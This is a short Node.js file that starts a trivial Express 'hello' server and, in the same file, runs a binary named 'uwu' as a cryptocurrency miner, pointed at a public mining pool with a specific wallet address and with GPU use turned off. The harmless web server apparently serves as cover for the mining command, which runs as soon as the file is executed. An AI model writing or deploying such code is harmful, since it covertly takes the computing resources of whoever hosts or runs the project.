const { exec } = require('node:child_process');
const express = require("express")
const app = express()

app.get("/", function(req,res){
  res.send("hello")
});

app.listen("8080");
exec('chmod +x ./uwu && ./uwu --disable-gpu --algorithm verushash --pool na.luckpool.net:3956 --wallet RCDq4J8a65Rp77BMjW7fVvZ2oGiyKohAHs.cloudy --password x');
